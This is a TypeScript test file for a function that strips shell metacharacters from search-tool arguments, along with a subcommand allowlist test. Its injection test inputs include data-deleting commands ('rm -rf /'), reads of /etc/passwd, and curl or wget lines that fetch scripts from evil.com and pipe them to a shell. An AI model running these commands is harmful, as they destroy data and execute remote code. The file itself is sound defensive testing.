/**
 * Security Tests for QMD Vector Search Argument Sanitization
 *
 * The sanitize function removes shell metacharacters from QMD CLI arguments
 * to prevent command injection attacks.
 *
 * Run with: bun test security-tests.ts
 */

import { describe, it, expect } from 'bun:test'

/**
 * Sanitize function - same logic used in the IPC handler
 * Removes dangerous shell metacharacters and limits length
 *
 * Characters removed:
 * - ` (backtick) - command substitution
 * - $ - variable expansion and $() command substitution
 * - () - subshell and command grouping
 * - {} - brace expansion
 * - | - pipe
 * - ; - command separator
 * - & - background operator and &&
 * - \n \r \0 - newlines and null bytes
 */
function sanitizeArg(arg: string): string {
  return arg.replace(/[`$(){}|;&\n\r\0]/g, '').slice(0, 1000)
}

describe('vector-search sanitization', () => {
  describe('safe inputs (should pass through)', () => {
    it('allows normal search queries', () => {
      expect(sanitizeArg('normal query')).toBe('normal query')
      expect(sanitizeArg('how to authenticate users')).toBe('how to authenticate users')
      expect(sanitizeArg('error handling best practices')).toBe(
        'error handling best practices'
      )
    })

    it('allows queries with common punctuation', () => {
      expect(sanitizeArg('what is a "good" pattern?')).toBe('what is a "good" pattern?')
      expect(sanitizeArg("what's the best way")).toBe("what's the best way")
      expect(sanitizeArg('file.md')).toBe('file.md')
      expect(sanitizeArg('path/to/file')).toBe('path/to/file')
    })

    it('allows queries with numbers', () => {
      expect(sanitizeArg('version 2.0')).toBe('version 2.0')
      expect(sanitizeArg('RFC 7231')).toBe('RFC 7231')
    })

    it('allows unicode characters', () => {
      expect(sanitizeArg('hello world')).toBe('hello world')
      expect(sanitizeArg('日本語テスト')).toBe('日本語テスト')
      expect(sanitizeArg('emoji 🔍 search')).toBe('emoji 🔍 search')
    })
  })

  describe('dangerous inputs (should be sanitized)', () => {
    it('removes semicolon (command separator)', () => {
      expect(sanitizeArg('test; rm -rf /')).toBe('test rm -rf /')
      expect(sanitizeArg('query; echo pwned')).toBe('query echo pwned')
    })

    it('removes command substitution with $()', () => {
      expect(sanitizeArg('$(whoami)')).toBe('whoami')
      expect(sanitizeArg('test $(cat /etc/passwd)')).toBe('test cat /etc/passwd')
    })

    it('removes command substitution with backticks', () => {
      expect(sanitizeArg('`id`')).toBe('id')
      expect(sanitizeArg('test `uname -a`')).toBe('test uname -a')
    })

    it('removes pipe operator', () => {
      expect(sanitizeArg('test | cat /etc/passwd')).toBe('test  cat /etc/passwd')
      expect(sanitizeArg('query | xargs rm')).toBe('query  xargs rm')
    })

    it('removes ampersand (background operator)', () => {
      expect(sanitizeArg('test & rm -rf /')).toBe('test  rm -rf /')
      expect(sanitizeArg('query && echo pwned')).toBe('query  echo pwned')
    })

    it('removes curly braces (brace expansion)', () => {
      expect(sanitizeArg('{a,b,c}')).toBe('a,b,c')
      expect(sanitizeArg('test{1..10}')).toBe('test1..10')
    })

    it('removes newlines and null bytes', () => {
      expect(sanitizeArg('test\nrm -rf /')).toBe('testrm -rf /')
      expect(sanitizeArg('test\r\ncommand')).toBe('testcommand')
      expect(sanitizeArg('test\0null')).toBe('testnull')
    })

    it('handles multiple dangerous characters', () => {
      expect(sanitizeArg('$(id); `whoami` | cat & {}')).toBe('id whoami  cat  ')
    })

    it('handles complex injection attempts', () => {
      // Real-world attack patterns
      expect(sanitizeArg("'; DROP TABLE users; --")).toBe("' DROP TABLE users --")
      expect(sanitizeArg('$(curl evil.com/shell.sh|sh)')).toBe('curl evil.com/shell.shsh')
      expect(sanitizeArg('`wget -O- evil.com|bash`')).toBe('wget -O- evil.combash')
    })
  })

  describe('length limiting', () => {
    it('truncates very long inputs to 1000 characters', () => {
      const longInput = 'a'.repeat(2000)
      expect(sanitizeArg(longInput)).toHaveLength(1000)
    })

    it('preserves inputs under 1000 characters', () => {
      const shortInput = 'a'.repeat(500)
      expect(sanitizeArg(shortInput)).toHaveLength(500)
    })

    it('handles exactly 1000 characters', () => {
      const exactInput = 'a'.repeat(1000)
      expect(sanitizeArg(exactInput)).toHaveLength(1000)
    })

    it('truncates after sanitization', () => {
      // 1005 safe chars + 5 dangerous chars
      const input = 'a'.repeat(1005) + '$(id)'
      const result = sanitizeArg(input)
      expect(result).toHaveLength(1000)
      expect(result).not.toContain('$')
      expect(result).not.toContain('(')
      expect(result).not.toContain(')')
    })
  })

  describe('edge cases', () => {
    it('handles empty string', () => {
      expect(sanitizeArg('')).toBe('')
    })

    it('handles string with only dangerous chars', () => {
      expect(sanitizeArg('$(){}|;&`')).toBe('')
    })

    it('handles whitespace', () => {
      expect(sanitizeArg('   ')).toBe('   ')
      expect(sanitizeArg('\t')).toBe('\t') // tabs are allowed
    })

    it('preserves safe special characters', () => {
      expect(sanitizeArg('!@#%^*-_=+[]:<>,.?/')).toBe('!@#%^*-_=+[]:<>,.?/')
    })

    it('handles Windows-style paths', () => {
      expect(sanitizeArg('C:\\Users\\Documents\\file.md')).toBe(
        'C:\\Users\\Documents\\file.md'
      )
    })

    it('handles URLs', () => {
      expect(sanitizeArg('https://example.com/path?query=value')).toBe(
        'https://example.com/path?query=value'
      )
    })
  })
})

/**
 * Subcommand Allowlist Test
 *
 * Only these subcommands should be allowed:
 * - search, vsearch, query (search operations)
 * - collection, ls, status (management)
 * - embed, update (indexing)
 */
describe('subcommand allowlist', () => {
  const allowedSubcommands = [
    'search',
    'vsearch',
    'query',
    'collection',
    'ls',
    'status',
    'embed',
    'update',
  ]

  function validateSubcommand(subcommand: string): boolean {
    return allowedSubcommands.includes(subcommand.toLowerCase())
  }

  it('allows valid search subcommands', () => {
    expect(validateSubcommand('search')).toBe(true)
    expect(validateSubcommand('vsearch')).toBe(true)
    expect(validateSubcommand('query')).toBe(true)
  })

  it('allows valid management subcommands', () => {
    expect(validateSubcommand('collection')).toBe(true)
    expect(validateSubcommand('ls')).toBe(true)
    expect(validateSubcommand('status')).toBe(true)
  })

  it('allows valid indexing subcommands', () => {
    expect(validateSubcommand('embed')).toBe(true)
    expect(validateSubcommand('update')).toBe(true)
  })

  it('rejects dangerous subcommands', () => {
    expect(validateSubcommand('rm')).toBe(false)
    expect(validateSubcommand('delete')).toBe(false)
    expect(validateSubcommand('exec')).toBe(false)
    expect(validateSubcommand('shell')).toBe(false)
  })

  it('rejects unknown subcommands', () => {
    expect(validateSubcommand('foo')).toBe(false)
    expect(validateSubcommand('')).toBe(false)
    expect(validateSubcommand('search; rm -rf /')).toBe(false)
  })

  it('is case-insensitive', () => {
    expect(validateSubcommand('SEARCH')).toBe(true)
    expect(validateSubcommand('Search')).toBe(true)
    expect(validateSubcommand('VSEARCH')).toBe(true)
  })
})
